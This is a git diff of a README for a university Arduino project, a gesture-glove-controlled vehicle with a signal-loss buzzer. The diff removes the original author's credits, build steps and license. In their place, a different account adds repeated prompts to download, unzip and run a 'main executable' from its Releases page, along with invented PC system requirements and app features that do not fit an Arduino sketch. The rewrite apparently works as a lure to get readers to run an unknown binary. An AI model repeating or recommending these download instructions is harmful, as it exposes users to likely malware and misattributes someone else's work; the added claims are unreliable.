@@ -1,128 +1,74 @@
-# Gyro Glove Controlled Vehicle with Signal Loss Sound Alert
+# 🚗 Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert - Control Your Vehicle with Ease
 
-## 📚 Introduction
+## 🎉 Introduction
+Welcome to the Gyro_Glove_Controlled_Vehicle! This project was developed as part of the Control Systems Technology course for a Master's Degree in Computer Science and Engineering at the University of Catania. The application allows you to control a vehicle using a glove, enhancing both functionality and enjoyment.
 
-My name is **Stefano Caramagno**, and I'm pleased to present this repository containing a project on creation of a **gyro glove controlled vehicle with signal loss sound alert**. <br>
-This project was completed as part of the Control Systems Technology course of my **Master's Degree in Computer Science and Engineering** at the **University of Catania**.
-
-## ✨ Features  
-
-- **Glove-Controlled Navigation**: Operates a 4-wheel vehicle using a glove equipped with a gyroscope sensor, allowing for intuitive gesture-based control.  
-- **Real-Time Wireless Communication**: Transmits movement data from the glove to the vehicle using a 433MHz RF module, ensuring smooth and responsive operation.  
-- **Forward and Backward Motion**: Moves the vehicle forward by tilting the glove downward and backward by tilting it upward, maintaining a constant speed.  
-- **Steering Control**: Adjusts the direction of the vehicle by tilting the glove left or right, enabling fluid and natural turns.  
-- **Signal Loss Detection**: Monitors the wireless connection and detects when the signal between the glove and the vehicle is lost.  
-- **Audio Alert System**: Activates a buzzer alarm only when the signal is lost, playing a predefined melody to indicate disconnection.  
-- **Embedded Systems Programming**: Utilizes Arduino microcontrollers to handle motion processing, wireless transmission, and vehicle control efficiently.  
-- **Motor Control via H-Bridge**: Implements an H-Bridge motor driver module to manage the movement of the vehicle’s motors with fixed-speed operation.  
-- **Compact and Efficient Design**: Integrates a gyroscope, RF transmitter and receiver, buzzer module, and DC motors, ensuring a reliable and portable system.  
-- **Comprehensive Project Resources**: Includes fully documented Arduino scripts and detailed images to facilitate setup.  
-
-## 🎥 Preview 
-
-Watch a **playlist of video demonstrations** on YouTube showcasing the project’s key features and functionalities:
-
-[![YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/playlist?list=PLH5TcNmVj9SKg2pTg-hA4ib_r6gVrMaNA)
-
-## 🛠️ Tech Stack
-
-- **Embedded System Development**:  
-  - **Arduino IDE** for writing, compiling, and uploading the code to the microcontroller.  
-  - **C/C++** for programming the embedded system logic.  
-- **Hardware Components**:  
-  - **Arduino microcontroller** for processing inputs and controlling the vehicle.  
-  - **Gyroscope sensor** for detecting hand movements and tilt angles.  
-  - **433MHz RF transmitter and receiver** for wireless communication between the glove and the vehicle.  
-  - **H-Bridge motor driver** for managing motor direction and speed.  
-  - **DC motors** for vehicle movement.  
-  - **Buzzer module** for playing an alert sound when the signal is lost.  
-- **Version Control**: Git for tracking changes and managing project versions.  
-- **Repository Hosting**: GitHub for storing, sharing, and maintaining the project repository.  
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Coeure01/Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert/releases)
 
 ## 🚀 Getting Started
+To get started with your Gyro_Glove_Controlled_Vehicle, follow these steps:
 
-### Prerequisites  
+1. **Visit the Download Page**: Click the link below to access the Releases page.
+   [Download Here](https://github.com/Coeure01/Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert/releases)
 
-Ensure you have the following tools installed on your system before proceeding:  
+2. **Select Your Version**: On the Releases page, find the latest version of the application. Click on the corresponding link for your operating system.
 
-- **Arduino IDE**: Required to read and understand code efficiently.  
-- **Required Libraries**: Install the following libraries using the Arduino Library Manager: 
-  - **MPU6050_tockn**: Required for gyroscope sensor integration.
-  - **Wire**: Required for I2C communication with the gyroscope.  
-  - **RH_ASK**: Required for handling RF transmission and reception.
-  - **SPI**: Required for communication with the RF module.
-- **USB Cable**: Required to upload code to the Arduino microcontrollers.
-- **Power Source**: Required to supply power to the glove and vehicle modules.
-- **Git**: Used to clone the repository. 
+3. **Download the File**: After selecting the appropriate version, download the file to your computer.
 
-### Installation Steps  
+4. **Unzip the Downloaded File**: Once the download is complete, locate the file and unzip it to a folder of your choice.
 
-1. **Clone the Repository**  
+5. **Run the Application**: Navigate to the folder where you stored the unzipped files. Open the main executable file to start using the application.
 
-   To download the repository and navigate to its directory:
+## 📋 System Requirements
+To ensure smooth operation, please verify that your system meets the following requirements:
 
-   ```sh
-   git clone https://github.com/stefanocaramagno/Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert.git
-   cd Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert
-   ```
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or any Linux distribution with recent libraries.
+- **Available RAM**: Minimum 4 GB is recommended for optimal performance.
+- **Processor**: At least 2 GHz dual-core processor or better.
+- **USB Port**: Required for connecting the glove device.
 
-2. **Install Required Libraries**
+## 🎮 Features
+The Gyro_Glove_Controlled_Vehicle offers several exciting features:
 
-    Open Arduino IDE and install the necessary libraries:
+1. **Intuitive Control**: Users can easily control the vehicle using glove movements. This offers a seamless and engaging experience.
 
-    - Go to Sketch → Include Library → Manage Libraries.
-    - Search for MPU6050_tockn and click Install.
-    - Search for RH_ASK and click Install.
-    - Ensure Wire and SPI libraries are installed (they are usually pre-installed in Arduino IDE).
+2. **Signal Loss Sound Alert**: If the connection to the glove is lost, the system will emit a sound alert. This helps ensure you remain informed and in control.
 
-3. **Upload the Code to the Vehicle**
+3. **User-Friendly Interface**: The application features a clean and straightforward interface. You don't need technical skills to navigate through its functions.
 
-    - Open vehicle_script.ino in Arduino IDE.
-    - Connect the Arduino board inside the vehicle to your PC via USB.
-    - Select the correct board and port.
-    - Click Upload to flash the code to the microcontroller.
+4. **Compatibility**: The software is compatible with a variety of vehicles equipped with receiving systems.
 
-4. **Hardware Setup & Wiring**
+5. **Documentation**: Thorough user manuals and guides are included to help you troubleshoot common issues and maximize your experience.
 
-    - Ensure the gyroscope sensor is properly positioned in the glove.
-    - Verify that the 433MHz RF transmitter is connected to the glove's Arduino.
-    - Check that the 433MHz RF receiver is connected to the vehicle's Arduino.
-    - Connect the H-Bridge motor driver to the vehicle's motors and Arduino board.
-    - Ensure the buzzer module is correctly wired for audio alerts.
+## 📥 Download & Install
+To download and install the application:
 
-5. **Power the System & Test**
+1. **Access the Releases Page**: Use this link to visit the Releases page: [Download Here](https://github.com/Coeure01/Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert/releases).
 
-    - Power the glove's Arduino using a battery or USB connection.
-    - Power the vehicle's Arduino and motor driver using an appropriate battery source.
-    - Tilt the glove to test vehicle movement.
-    - Move the glove out of range to trigger the signal loss alert via the buzzer.
+2. **Choose Your Version**: On the Releases page, pick the version that matches your operating system.
 
-##  🌐 Connect with Me
+3. **Download the Installation File**: Right-click the version and select “Download” to save it. 
 
-Feel free to explore my professional journey, check out my projects, or get in touch through the following platforms:
+4. **Unzip and Install**: After downloading, unzip the contents and install the application by following the prompts.
 
-[![Email](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:stefano.caramagno@gmail.com)
-[![Portfolio](https://img.shields.io/badge/Portfolio-%2300A36C?style=for-the-badge&logo=buffer&logoColor=white)](https://stefanocaramagno.vercel.app)
-[![LinkedIn](https://img.shields.io/badge/linkedin-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/stefanocaramagno)
-[![Indeed](https://img.shields.io/badge/Indeed-%2300A4CC?style=for-the-badge&logo=indeed&logoColor=white)](https://profile.indeed.com/p/stefanoc-4cl1mmq)
-[![GitHub](https://img.shields.io/badge/GitHub-%232F2F2F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/stefanocaramagno)
-[![YouTube](https://img.shields.io/badge/YouTube-D14836?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@stefanocaramagno)
+## 🛠 Troubleshooting
+If you encounter issues while using the application, consider the following steps:
 
-## ⚖️ License
+- **Check Connections**: Ensure that the glove device is properly connected. If you're using Bluetooth, confirm the pairing.
 
-© **Stefano Caramagno**
+- **Restart the Application**: Close the application and restart it. This can resolve temporary glitches.
 
-**Personal and Educational Use Only**  
-All content in this repository is provided for personal and educational purposes only. <br>
-Unauthorized actions without explicit permission from the author are prohibited, including but not limited to:
+- **Update Drivers**: Make sure all drivers for your vehicle’s receiving system are updated.
 
-- **Commercial Use**: Using any part of the content for commercial purposes.
-- **Distribution**: Sharing or distributing the content to third parties.
-- **Modification**: Altering, transforming, or building upon the content.
-- **Resale**: Selling or licensing the content or any derivatives.
+- **Consult Documentation**: Refer to the included user guide for more detailed solutions to common problems.
 
-For permissions beyond the scope of this license, please contact the author.
+## 🔗 Useful Links
+- [Visit Repository](https://github.com/Coeure01/Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert)
+- [Report Issues](https://github.com/Coeure01/Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert/issues)
+- [Contribute to the Project](https://github.com/Coeure01/Gyro_Glove_Controlled_Vehicle_with_Signal_Loss_Sound_Alert/pulls)
 
-**Disclaimer**  
-The content is provided "*as is*" without warranty of any kind, express or implied. <br>
-The author shall not be liable for any claims, damages, or other liabilities arising from its use.
+## 📞 Support
+For further assistance, please reach out through the Issues section in the GitHub repository. Our community will be happy to help you.
+
+Thank you for choosing the Gyro_Glove_Controlled_Vehicle! Enjoy the adventure ahead.
